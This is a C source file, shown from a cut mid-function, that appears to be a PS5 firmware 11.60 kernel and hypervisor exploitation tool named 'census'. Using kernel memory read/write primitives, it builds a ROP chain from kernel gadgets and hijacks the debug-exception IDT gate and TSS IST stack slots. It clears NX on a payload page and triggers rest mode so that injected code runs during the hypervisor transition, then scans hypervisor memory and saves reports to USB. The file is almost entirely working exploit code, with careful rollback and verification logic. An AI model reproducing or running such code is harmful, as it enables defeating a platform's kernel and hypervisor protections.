  STORE_PARAM(CENSUS_P_CODE_BASE, code_base);
#undef STORE_PARAM

  if (chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RDI_RET)))
    return -1;
  restore_rdi_off = off;
  if (chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RSI_RET)) ||
      chain_q(handler, &off, 0x400, payload_va) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RDX_RET)) ||
      chain_q(handler, &off, 0x400, cr3) ||
      chain_q(handler, &off, 0x400, kg(OFF_GAD_POP_RSP_RET)) ||
      chain_q(handler, &off, 0x400, trampoline))
    return -1;
  memcpy(handler + save_addr_off, &(uint64_t){handler_va + restore_rdi_off}, 8);
  return 0;
}

__attribute__((noinline)) static int
arm_dr0_and_return(uint64_t db_gate, uint64_t gate_lo, uint64_t arm_ctx,
                   uint64_t return_frame) {
  uint64_t rsp, rbx, rbp, r12, r13, r14, r15;
  void *resume_label = &&resumed;

  __asm__ volatile("mov %%rsp,%0" : "=r"(rsp));
  __asm__ volatile("mov %%rbx,%0" : "=r"(rbx));
  __asm__ volatile("mov %%rbp,%0" : "=r"(rbp));
  __asm__ volatile("mov %%r12,%0" : "=r"(r12));
  __asm__ volatile("mov %%r13,%0" : "=r"(r13));
  __asm__ volatile("mov %%r14,%0" : "=r"(r14));
  __asm__ volatile("mov %%r15,%0" : "=r"(r15));

  if (kwrite64(arm_ctx + 0x00, r15) ||
      kwrite64(arm_ctx + 0x08, r14) ||
      kwrite64(arm_ctx + 0x10, r13) ||
      kwrite64(arm_ctx + 0x18, r12) || kwrite64(arm_ctx + RC_RBP, rbp) ||
      kwrite64(arm_ctx + RC_RSP, return_frame - 7 * sizeof(uint64_t)) ||
      kwrite64(arm_ctx + 0x30, rbx) ||
      kwrite64(arm_ctx + RC_RIP, kg(OFF_GAD_RET_TRAMP)) ||
      kwrite64(return_frame + 0x00, (uint64_t)resume_label) ||
      kwrite64(return_frame + 0x08, KH_USER_CS) ||
      kwrite64(return_frame + 0x10, KH_RFLAGS_USER) ||
      kwrite64(return_frame + 0x18, rsp) ||
      kwrite64(return_frame + 0x20, KH_USER_SS) ||
      kwrite64(db_gate, gate_lo))
    return -1;
  __asm__ volatile("pushfq\n\t"
                   "orq $0x100, (%%rsp)\n\t"
                   "popfq\n\t"
                   "nop\n\t"
                   :
                   :
                   : "memory", "cc");
resumed:
  return 0;
}

static int arm_startup_carrier(uint64_t hv_base, uint64_t hv_size,
                               uint64_t scan_lo, uint64_t scan_hi,
                               uint64_t code_base,
                               const uint64_t saved_ists[NCPU]) {
  const uint64_t data_cave = kg(OFF_DATA_CAVE);
  const uint64_t tss_base = kg(OFF_COMMON_TSS);
  const uint64_t db_gate = kg(OFF_IDT) + 16;
  const uint64_t arm_va = data_cave + CAVE_ARM_OFF;
  const uint64_t handler_va = data_cave + CAVE_HANDLER_OFF;
  uint64_t saved_gate_lo, saved_gate_hi, state;
  uint64_t gate_lo, gate_hi;
  uint8_t arm[0x400], handler[0x400], fallback[FALLBACK_SIZE];
  uint8_t staged[AP_COPY_SIZE], verify[0x400];

  if (kread64(db_gate, &saved_gate_lo) ||
      kread64(db_gate + 8, &saved_gate_hi) ||
      kread64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, &state) ||
      census_bin_len == 0 || census_bin_len > sizeof(staged) || state != 0)
    return -1;
  gate_encode(kg(OFF_GAD_PIVOT_ADD_RSP28_RET),
              (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return -2;

  memset(staged, 0, sizeof(staged));
  memcpy(staged, census_bin, census_bin_len);
  if (kwrite(data_cave + CAVE_AP_SOURCE_OFF, staged, sizeof(staged)))
    return -3;
  for (size_t checked = 0; checked < sizeof(staged); checked += sizeof(verify)) {
    if (kread(data_cave + CAVE_AP_SOURCE_OFF + checked, verify,
              sizeof(verify)) ||
        memcmp(verify, staged + checked, sizeof(verify)))
      return -3;
  }
  if (build_arm(arm, arm_va, tss_ist_slot(tss_base, 0, 6),
                handler_va + STACK_TOP_OFF) ||
      build_handler(handler, handler_va, data_cave, saved_gate_lo, hv_base,
                    hv_size, scan_lo, scan_hi, code_base))
    return -4;

  if (kwrite(arm_va, arm, sizeof(arm)) ||
      kwrite(handler_va, handler, sizeof(handler)) ||
      kread(arm_va, verify, sizeof(verify)) ||
      memcmp(verify, arm, sizeof(verify)))
    return -5;
  if (kread(handler_va, verify, sizeof(verify)) ||
      memcmp(verify, handler, sizeof(verify)))
    return -5;

  for (int cpu = 1; cpu < NCPU; cpu++) {
    const uint64_t va =
        data_cave + CAVE_FALLBACKS_OFF + (uint64_t)(cpu - 1) * FALLBACK_SIZE;
    if (build_passthrough(fallback, va))
      return -6;
    if (kwrite(va, fallback, sizeof(fallback)) ||
        kread(va, verify, sizeof(fallback)) ||
        memcmp(verify, fallback, sizeof(fallback)))
      return -6;
  }

  if (kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_GATE_LO, saved_gate_lo) ||
      kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_GATE_HI, saved_gate_hi))
    return -7;
  for (int cpu = 0; cpu < NCPU; cpu++)
    if (kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_ISTS + (uint64_t)cpu * 8,
                 saved_ists[cpu]))
      return -7;
  if (kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED) ||
      kread64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, &state) ||
      state != STATE_ARMED)
    return -7;

  if (kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + STACK_TOP_OFF))
    goto rollback;
  for (int cpu = 1; cpu < NCPU; cpu++) {
    const uint64_t top = data_cave + CAVE_FALLBACKS_OFF +
                         (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
    if (kwrite64(tss_ist_slot(tss_base, cpu, 6), top))
      goto rollback;
  }
  for (int cpu = 0; cpu < NCPU; cpu++) {
    const uint64_t want =
        cpu == 0 ? arm_va + STACK_TOP_OFF
                 : data_cave + CAVE_FALLBACKS_OFF +
                       (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
    uint64_t actual;
    if (kread64(tss_ist_slot(tss_base, cpu, 6), &actual) || actual != want)
      goto rollback;
  }

  if (arm_dr0_and_return(db_gate, gate_lo, arm_va + CAVE_ARM_CTX_OFF,
                         arm_va + CAVE_ARM_CONT_OFF + 6 * sizeof(uint64_t)))
    goto rollback;
  uint64_t live_gate_lo, live_gate_hi;
  if (kread64(db_gate, &live_gate_lo) ||
      kread64(db_gate + 8, &live_gate_hi) ||
      live_gate_hi != saved_gate_hi)
    return -9;
  if (live_gate_lo != saved_gate_lo) {
    if (kwrite64(db_gate, saved_gate_lo) ||
        kread64(db_gate, &live_gate_lo) || live_gate_lo != saved_gate_lo)
      return -9;
    goto rollback;
  }
  return 0;

rollback:
  const int ist_rc = restore_ists(saved_ists);
  const int state_write_rc =
      kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, 0);
  const int state_read_rc =
      kread64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, &state);
  const int state_rc = state_write_rc || state_read_rc || state;
  if (ist_rc || state_rc)
    return -9;
  return -8;
}

/* A successful event signal commits the suspend request.  Closing the event
 * handle happens after that point and must not cause a rollback that races a
 * transition already in progress, so its result is reported separately. */
static int enter_rest_mode(int *close_failed) {
  void *event = NULL;
  *close_failed = 0;
  if (sceKernelOpenEventFlag(&event, "SceSystemStateMgrStatus") || !event)
    return -1;
  int rc = sceKernelNotifySystemSuspendStart();
  if (!rc)
    rc = sceKernelSetEventFlag(event, 0x400);
  const int close_rc = sceKernelCloseEventFlag(&event);
  if (rc)
    return -1;
  *close_failed = close_rc != 0;
  return 0;
}

static size_t appendf(char *out, size_t cap, size_t used, const char *fmt,
                      ...) {
  if (used >= cap)
    return used;
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(out + used, cap - used, fmt, ap);
  va_end(ap);
  if (n < 0)
    return used;
  return (size_t)n >= cap - used ? cap : used + (size_t)n;
}

static int write_unique_preflight(const char *text, size_t size,
                                  char *saved_path, size_t saved_path_size) {
  char root[128], name[128], destination[320], temp[320];

  for (int usb = 0; usb < 8; usb++) {
    snprintf(root, sizeof(root), USB_ROOT_FMT, usb);
    if (!is_mount_point(root))
      continue;
    for (int n = 1; n < 100; n++) {
      if (n == 1)
        snprintf(name, sizeof(name), "%s-preflight.txt", REPORT_BASE);
      else
        snprintf(name, sizeof(name), "%s-preflight-%02d.txt", REPORT_BASE,
                 n);
      snprintf(destination, sizeof(destination), "%s/%s", root, name);
      snprintf(temp, sizeof(temp), "%s/%s.tmp", root, name);
      const int destination_state = path_state(destination);
      const int temp_state = path_state(temp);
      if (destination_state < 0 || temp_state < 0)
        break;
      if (destination_state || temp_state)
        continue;
      int fd = open(temp, O_WRONLY | O_CREAT | O_EXCL, 0600);
      if (fd < 0) {
        if (errno == EEXIST)
          continue;
        break;
      }
      int rc = write_all(fd, text, size);
      if (!rc)
        rc = fsync(fd);
      if (close(fd) && !rc)
        rc = -1;
      if (!rc && path_state(destination) != 0)
        rc = -1;
      if (!rc && rename(temp, destination))
        rc = -1;
      if (!rc)
        rc = fsync_dir(root);
      if (rc) {
        unlink(temp);
        return -1;
      }
      snprintf(saved_path, saved_path_size, "%s", destination);
      return 0;
    }
  }
  return -1;
}

static int save_preflight_gate_report(
    const char *model, uint64_t hv_base, uint64_t hv_size, uint64_t scan_lo,
    uint64_t scan_hi, uint64_t mapped_pages, int mapping_rc,
    int boundary_present, int cave_present, int vmexit_present,
    int ap_path_rc, const struct ap_path_state *ap_path, int tss_rc,
    int idt_read_rc, char *saved_path, size_t saved_path_size) {
  char text[4096];
  size_t used = 0;

  used = appendf(
      text, sizeof(text), used,
      "ps5-1160-census preflight diagnostic\n"
      "variant %s\nfirmware 0x%08x\nSoC 0x%x\nmodel %s\n"
      "Keep private: bounded runtime evidence. No HV bytes are included.\n"
      "HV base 0x%llx size 0x%llx\nscan offsets 0x%llx..0x%llx\n"
      "mapped pages %llu\nmapping rc %d\n"
      "boundary page present %d\ncave page present %d\n"
      "VMEXIT page present %d\nAP path rc %d levels %d NX mask 0x%llx\n"
      "TSS rc %d\nIDT read rc %d\ncarrier armed 0\n",
      CENSUS_VARIANT, kernel_get_fw_version(), sceKernelGetMainSocId(), model,
      (unsigned long long)hv_base, (unsigned long long)hv_size,
      (unsigned long long)scan_lo, (unsigned long long)scan_hi,
      (unsigned long long)mapped_pages, mapping_rc, boundary_present,
      cave_present, vmexit_present, ap_path_rc, ap_path->levels,
      (unsigned long long)ap_path->nx_mask, tss_rc, idt_read_rc);
  for (int level = 0; level < ap_path->levels; level++)
    used = appendf(text, sizeof(text), used,
                   "AP path[%d] address 0x%llx value %016llx\n", level,
                   (unsigned long long)ap_path->address[level],
                   (unsigned long long)ap_path->original[level]);
  if (used >= sizeof(text))
    return -1;
  return write_unique_preflight(text, used, saved_path, saved_path_size);
}

static int save_report(const char *root, const char *model,
                       const struct census_report *report,
                       uint64_t map_pages, int rest_close_failed,
                       int success, const struct ap_path_state *ap_path,
                       int ap_restore_rc) {
  char pending[256], destination[320], temp[320];
  char text[8192];
  size_t used = 0;

  used = appendf(text, sizeof(text), used,
                 "ps5-1160-census %llu\n"
                 "variant %s\nresult %s\n"
                 "Keep private: bounded runtime evidence from kernel/HV "
                 "state. No raw memory is included.\n"
                 "firmware 0x%08x\nSoC 0x%x\nmodel %s\n"
                 "HV base 0x%llx size 0x%llx\n"
                 "scan offsets 0x%llx..0x%llx\n"
                 "main mapped pages %llu\nAP mapped pages %llu\n"
                 "AP scanned pages %llu\nstate 0x%llx error %llu\n"
                 "self PA 0x%llx count %llu\n"
                 "self nctl 0x%llx ncr3 0x%llx asid %llu\n"
                 "self iopm 0x%llx msrpm 0x%llx\n"
                 "targets %llu recorded %llu\n"
                 "field hash before %016llx after %016llx\n"
                 "IST6 restored %llu read back %llu\n"
                 "carrier cleared %llu\n"
                 "code base 0x%llx\n"
                 "boundary offset 0x%llx length %llu hash %016llx\n"
                 "cave offset 0x%llx length %llu hash %016llx\n"
                 "VMEXIT offset 0x%llx length %llu hash %016llx\n"
                 "anchor valid mask 0x%llx match mask 0x%llx\n",
                 (unsigned long long)CENSUS_REPORT_VERSION, CENSUS_VARIANT,
                 success ? "complete" : "failed-private-diagnostic",
                 kernel_get_fw_version(), sceKernelGetMainSocId(), model,
                 (unsigned long long)report->hv_base,
                 (unsigned long long)report->hv_size,
                 (unsigned long long)report->scan_lo,
                 (unsigned long long)report->scan_hi,
                 (unsigned long long)map_pages,
                 (unsigned long long)report->mapped_pages,
                 (unsigned long long)report->scanned_pages,
                 (unsigned long long)report->state,
                 (unsigned long long)report->error,
                 (unsigned long long)report->self_pa,
                 (unsigned long long)report->self_count,
                 (unsigned long long)report->self_nctl,
                 (unsigned long long)report->self_ncr3,
                 (unsigned long long)report->self_asid,
                 (unsigned long long)report->self_iopm,
                 (unsigned long long)report->self_msrpm,
                 (unsigned long long)report->target_count,
                 (unsigned long long)report->candidate_recorded,
                 (unsigned long long)report->fields_hash_before,
                 (unsigned long long)report->fields_hash_after,
                 (unsigned long long)report->restore_count,
                 (unsigned long long)report->restore_readback_count,
                 (unsigned long long)report->carrier_cleared,
                 (unsigned long long)report->code_base,
                 (unsigned long long)CENSUS_BOUNDARY_OFFSET,
                 (unsigned long long)CENSUS_BOUNDARY_LENGTH,
                 (unsigned long long)report->boundary_hash,
                 (unsigned long long)CENSUS_CAVE_OFFSET,
                 (unsigned long long)CENSUS_CAVE_LENGTH,
                 (unsigned long long)report->cave_hash,
                 (unsigned long long)CENSUS_VMEXIT_OFFSET,
                 (unsigned long long)CENSUS_VMEXIT_LENGTH,
                 (unsigned long long)report->vmexit_hash,
                 (unsigned long long)report->anchor_valid_mask,
                 (unsigned long long)report->anchor_match_mask);
  used = appendf(text, sizeof(text), used,
                 "anchor match policy %s\n"
                 "AP path levels %d original NX mask 0x%llx\n"
                 "AP path restore rc %d remaining touched mask 0x%llx\n"
                 "post-commit event close failed %d\n",
                 CENSUS_VARIANT_PRO ? "evidence-only" : "required",
                 ap_path->levels, (unsigned long long)ap_path->nx_mask,
                 ap_restore_rc, (unsigned long long)ap_path->touched_mask,
                 rest_close_failed);
  for (uint64_t i = 0;
       i < report->candidate_recorded && i < CENSUS_CANDIDATE_MAX; i++)
    used = appendf(text, sizeof(text), used, "candidate[%llu] 0x%llx\n",
                   (unsigned long long)i,
                   (unsigned long long)report->candidate_pa[i]);
  if (used >= sizeof(text))
    return -1;

  printf("%s", text);
  snprintf(pending, sizeof(pending), "%s/%s", root, pending_name);
  if (path_state(pending) != 1)
    return -1;
  if (success) {
    snprintf(destination, sizeof(destination), "%s/%s", root, final_name);
    snprintf(temp, sizeof(temp), "%s/%s", root, temp_name);
  } else {
    snprintf(destination, sizeof(destination), "%s/%s.diagnostic", root,
             pending_name);
    snprintf(temp, sizeof(temp), "%s/%s.diagnostic.tmp", root,
             pending_name);
  }
  if (path_state(destination) != 0 || path_state(temp) != 0)
    return -1;
  int fd = open(temp, O_WRONLY | O_CREAT | O_EXCL, 0600);
  if (fd < 0)
    return -1;
  int rc = write_all(fd, text, used);
  if (!rc)
    rc = fsync(fd);
  if (close(fd) && !rc)
    rc = -1;
  if (rc || rename(temp, destination) || fsync_dir(root)) {
    unlink(temp);
    return -1;
  }
  if (success && (unlink(pending) || fsync_dir(root)))
    return -1;
  return 0;
}

static int report_candidates_valid(const struct census_report *report,
                                   uint64_t base, uint64_t scan_lo,
                                   uint64_t scan_hi) {
  int saw_self = 0;
  if (report->target_count != NCPU || report->candidate_recorded != NCPU)
    return 0;
  for (uint64_t i = 0; i < report->candidate_recorded; i++) {
    const uint64_t pa = report->candidate_pa[i];
    if ((pa & (FRAME - 1)) || pa < base + scan_lo || pa >= base + scan_hi)
      return 0;
    if (pa == report->self_pa)
      saw_self++;
    for (uint64_t prior = 0; prior < i; prior++)
      if (pa == report->candidate_pa[prior])
        return 0;
  }
  return saw_self == 1;
}

int main(void) {
  char usb_root[128], pending_path[256], preflight[1024];
  char diagnostic_path[320] = {0};
  uint8_t bitmap[CAVE_BITMAP_CAP], zero_cave[0x4000];
  uint64_t hv_base = 0, hv_size = 0, mapped_pages = 0, saved_ists[NCPU];
  uint64_t saved_db_gate[2], scan_lo, scan_hi, expected_base, expected_size;
  uint64_t code_lo, code_base;
  struct ap_path_state ap_path;
  struct census_report first, second;
  int pending_fd = -1;
  const int soc_id = sceKernelGetMainSocId();
  char model[1024] = {0};
  const int model_rc = sceKernelGetHwModelName(model);
  model[sizeof(model) - 1] = 0;
  const int is_pro = soc_id == PS5_PRO_SOC_ID;
  int rest_close_failed = 0;
  const int dtrace_state =
      path_state("/system/priv/lib/libSceDeci5Dtracep.sprx");
  const int tty_state = path_state("/system/priv/lib/libSceDeci5Ttyp.sprx");

  signal(SIGPIPE, SIG_IGN);
  if (kernel_get_fw_version() != FW_1160_RAW ||
      dtrace_state != 0 || tty_state != 0 ||
      soc_id < 0 || is_pro != CENSUS_VARIANT_PRO || model_rc || !model[0]) {
    notify("11.60 %s census refused: wrong firmware, kit, or hardware variant",
           CENSUS_VARIANT);
    return 1;
  }
  expected_base = CENSUS_VARIANT_PRO ? HV_BASE_PRO : HV_BASE_REGULAR;
  expected_size = CENSUS_VARIANT_PRO ? HV_SIZE_PRO : HV_SIZE_REGULAR;
  scan_lo = CENSUS_VARIANT_PRO ? HV_SCAN_LO_PRO : HV_SCAN_LO_REGULAR;
  scan_hi = CENSUS_VARIANT_PRO ? HV_SCAN_HI_PRO : HV_SCAN_HI_REGULAR;
  code_lo = CENSUS_VARIANT_PRO ? HV_CODE_LO_PRO : HV_CODE_LO_REGULAR;
  code_base = expected_base + code_lo;
  if (init_kernel_layout() || validate_build() ||
      parse_hv_region(expected_base, expected_size, &hv_base, &hv_size)) {
    notify("11.60 census refused: build or boot metadata did not match");
    return 1;
  }

  memset(zero_cave, 0, sizeof(zero_cave));
  uint8_t cave_now[sizeof(zero_cave)];
  if (kread(kg(OFF_DATA_CAVE), cave_now, sizeof(cave_now)) ||
      memcmp(cave_now, zero_cave, sizeof(cave_now))) {
    notify("11.60 census refused: data cave is unreadable or not clean");
    return 1;
  }
  const int mapping_rc =
      build_mapping_bitmap(hv_base, hv_size, scan_lo, scan_hi, bitmap,
                           sizeof(bitmap), &mapped_pages);
  const int boundary_present =
      !mapping_rc &&
      bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
                           code_lo + CENSUS_BOUNDARY_OFFSET,
                           CENSUS_BOUNDARY_LENGTH);
  const int cave_present =
      !mapping_rc &&
      bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
                           code_lo + CENSUS_CAVE_OFFSET, CENSUS_CAVE_LENGTH);
  const int vmexit_present =
      !mapping_rc &&
      bitmap_range_present(bitmap, sizeof(bitmap), hv_size,
                           code_lo + CENSUS_VMEXIT_OFFSET,
                           CENSUS_VMEXIT_LENGTH);
  const int ap_path_rc = inspect_ap_path(AP_PAYLOAD_PAGE, &ap_path);
  const int tss_rc = verify_tss_layout(saved_ists);
  const int idt_read_rc =
      kread(kg(OFF_IDT) + 16, saved_db_gate, sizeof(saved_db_gate));
  if (mapping_rc || !boundary_present || !cave_present || !vmexit_present ||
      ap_path_rc || tss_rc || idt_read_rc) {
    const char *failed_gate =
        mapping_rc           ? "mapping"
        : !boundary_present  ? "boundary anchor page"
        : !cave_present      ? "code-cave anchor page"
        : !vmexit_present    ? "VMEXIT anchor page"
        : ap_path_rc         ? "AP page walk"
        : tss_rc             ? "TSS layout"
                             : "IDT read";
    const int diagnostic_rc = save_preflight_gate_report(
        model, hv_base, hv_size, scan_lo, scan_hi, mapped_pages, mapping_rc,
        boundary_present, cave_present, vmexit_present, ap_path_rc, &ap_path,
        tss_rc, idt_read_rc, diagnostic_path, sizeof(diagnostic_path));
    notify("11.60 census refused: %s failed; %s", failed_gate,
           diagnostic_rc ? "preflight diagnostic save failed"
                         : "private preflight diagnostic saved to USB");
    return 1;
  }
  if (reserve_pending(usb_root, sizeof(usb_root), &pending_fd)) {
    notify("11.60 census refused: mount a writable USB drive");
    return 1;
  }
  snprintf(pending_path, sizeof(pending_path), "%s/%s", usb_root,
           pending_name);
  int preflight_len = snprintf(
      preflight, sizeof(preflight),
      "ps5-1160-census pending\nvariant %s\nfirmware 0x%08x\nSoC 0x%x\n"
      "model %s\n"
      "HV base 0x%llx size 0x%llx\nscan offsets 0x%llx..0x%llx\n"
      "code base 0x%llx\nmapped pages %llu\n"
      "AP path levels %d original NX mask 0x%llx\n"
      "If this file remains pending, "
      "report whether the console resumed and cold reboot before another "
      "census.\n",
      CENSUS_VARIANT, kernel_get_fw_version(), sceKernelGetMainSocId(),
      model,
      (unsigned long long)hv_base, (unsigned long long)hv_size,
      (unsigned long long)scan_lo, (unsigned long long)scan_hi,
      (unsigned long long)code_base, (unsigned long long)mapped_pages,
      ap_path.levels, (unsigned long long)ap_path.nx_mask);
  int pending_rc =
      preflight_len <= 0 || (size_t)preflight_len >= sizeof(preflight)
          ? -1
          : write_all(pending_fd, preflight, (size_t)preflight_len);
  if (!pending_rc)
    pending_rc = fsync(pending_fd);
  if (close(pending_fd) && !pending_rc)
    pending_rc = -1;
  pending_fd = -1;
  if (!pending_rc)
    pending_rc = fsync_dir(usb_root);
  if (pending_rc) {
    remove_pending(usb_root, pending_path);
    notify("11.60 census refused: could not durably save pending report");
    return 1;
  }

  memset(&first, 0, sizeof(first));
  if (kwrite(kg(OFF_DATA_CAVE) + CAVE_BITMAP_OFF, bitmap, sizeof(bitmap)) ||
      kwrite(kg(OFF_DATA_CAVE) + CAVE_REPORT_OFF, &first, sizeof(first)) ||
      kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL)) {
    const int clean_rc = clear_data_cave();
    const int pending_cleanup_rc =
        clean_rc ? -1 : remove_pending(usb_root, pending_path);
    notify("11.60 census refused during staging%s",
           pending_cleanup_rc ? "; pending may remain, cold reboot required"
                              : "");
    return 1;
  }
  if (pin_to_tss0()) {
    const int affinity_rc = restore_affinity();
    const int clean_rc = clear_data_cave();
    const int pending_cleanup_rc =
        affinity_rc || clean_rc ? -1
                                : remove_pending(usb_root, pending_path);
    notify("11.60 census refused: CPU15 pin failed%s",
           pending_cleanup_rc ? "; pending may remain, cold reboot required"
                              : "");
    return 1;
  }

  const int arm_rc = arm_startup_carrier(
      hv_base, hv_size, scan_lo, scan_hi, code_base, saved_ists);
  if (arm_rc) {
    const int affinity_rc = restore_affinity();
    const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
    const int ap_restore_rc = restore_ap_path(&ap_path);
    const int pending_cleanup_rc =
        affinity_rc || cleanup_rc || ap_restore_rc
            ? -1
            : remove_pending(usb_root, pending_path);
    notify("11.60 census carrier refused to arm (%d); %s", arm_rc,
           pending_cleanup_rc ? "pending retained, cold reboot required"
                              : "carrier cleanup verified");
    return 1;
  }

  notify("11.60 census armed. Entering rest mode in 5 seconds");
  sleep(5);
  const int ap_exec_rc = make_ap_path_executable(&ap_path);
  if (ap_exec_rc) {
    const int affinity_rc = restore_affinity();
    const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
    const int ap_restore_rc = restore_ap_path(&ap_path);
    const int pending_cleanup_rc =
        affinity_rc || cleanup_rc || ap_restore_rc
            ? -1
            : remove_pending(usb_root, pending_path);
    notify("11.60 census refused: AP NX transaction failed (%d); %s",
           ap_exec_rc,
           pending_cleanup_rc
               ? "pending retained, cold reboot required"
               : "carrier cleanup and AP path restoration verified");
    return 1;
  }
  if (enter_rest_mode(&rest_close_failed)) {
    const int affinity_rc = restore_affinity();
    const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
    const int ap_restore_rc = restore_ap_path(&ap_path);
    const int pending_cleanup_rc =
        affinity_rc || cleanup_rc || ap_restore_rc
            ? -1
            : remove_pending(usb_root, pending_path);
    notify("11.60 census suspend trigger failed; %s",
           pending_cleanup_rc ? "pending retained, cold reboot required"
                              : "carrier cleanup verified");
    return 1;
  }

  for (;;) {
    if (kread(kg(OFF_DATA_CAVE) + CAVE_REPORT_OFF, &first, sizeof(first))) {
      const int affinity_rc = restore_affinity();
      const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
      const int ap_restore_rc = restore_ap_path(&ap_path);
      notify("11.60 census report read failed; pending retained%s",
             affinity_rc || cleanup_rc || ap_restore_rc
                 ? ", cold reboot required"
                 : ", cleanup verified; cold reboot required before retry");
      return 1;
    }
    if (first.state == CENSUS_STATE_DONE) {
      usleep(250000);
      if (kread(kg(OFF_DATA_CAVE) + CAVE_REPORT_OFF, &second,
                sizeof(second))) {
        const int affinity_rc = restore_affinity();
        const int cleanup_rc = rollback_carrier(saved_db_gate, saved_ists);
        const int ap_restore_rc = restore_ap_path(&ap_path);
        notify("11.60 census report read failed; pending retained%s",
               affinity_rc || cleanup_rc || ap_restore_rc
                   ? ", cold reboot required"
                   : ", cleanup verified; cold reboot required before retry");
        return 1;
      }
      if (!memcmp(&first, &second, sizeof(first)))
        break;
    }
    sleep(1);
  }

  const int affinity_rc = restore_affinity();
  const int report_valid =
      first.magic == CENSUS_REPORT_MAGIC &&
      first.version == CENSUS_REPORT_VERSION && first.size == sizeof(first) &&
      first.state == CENSUS_STATE_DONE && first.error == 0 &&
      first.hv_base == expected_base && first.hv_size == expected_size &&
      first.scan_lo == scan_lo && first.scan_hi == scan_hi &&
      first.mapped_pages == mapped_pages &&
      first.scanned_pages == (scan_hi - scan_lo) / FRAME &&
      first.self_count == 1 &&
      report_candidates_valid(&first, expected_base, scan_lo, scan_hi) &&
      first.fields_hash_before == first.fields_hash_after &&
      first.restore_count == NCPU && first.restore_readback_count == NCPU &&
      first.carrier_cleared && first.code_base == code_base &&
      first.anchor_valid_mask == 7 &&
      (CENSUS_VARIANT_PRO || first.anchor_match_mask == 7);

  uint64_t live_state = UINT64_MAX, live_gate_lo = 0, live_gate_hi = 0;
  const int state_read_rc =
      kread64(kg(OFF_DATA_CAVE) + CAVE_SAVE_OFF + SAVE_STATE, &live_state);
  const int gate_read_rc =
      kread64(kg(OFF_IDT) + 16, &live_gate_lo) ||
      kread64(kg(OFF_IDT) + 24, &live_gate_hi);
  const int ap_state_cleared = !state_read_rc && live_state == 0;
  const int live_ists_restored = verify_ists(saved_ists) == 0;
  const int live_gate_restored =
      !gate_read_rc && live_gate_lo == saved_db_gate[0] &&
      live_gate_hi == saved_db_gate[1];

  const int carrier_cleanup_rc =
      rollback_carrier(saved_db_gate, saved_ists);
  const int ap_restore_rc = restore_ap_path(&ap_path);
  const int success = report_valid && ap_state_cleared &&
                      live_ists_restored && live_gate_restored &&
                      !affinity_rc && !carrier_cleanup_rc && !ap_restore_rc;
  const int save_rc = save_report(usb_root, model, &first, mapped_pages,
                                  rest_close_failed, success, &ap_path,
                                  ap_restore_rc);

  if (!success) {
    notify("11.60 census failed validation; pending retained%s",
           save_rc ? " and diagnostic save failed" : " with private diagnostic");
    return 1;
  }
  if (save_rc) {
    notify("11.60 census complete, but final USB report save failed; cold "
           "reboot required");
    return 1;
  }
  notify("11.60 census complete; report saved to USB. Cold reboot before reuse");
  return 0;
}
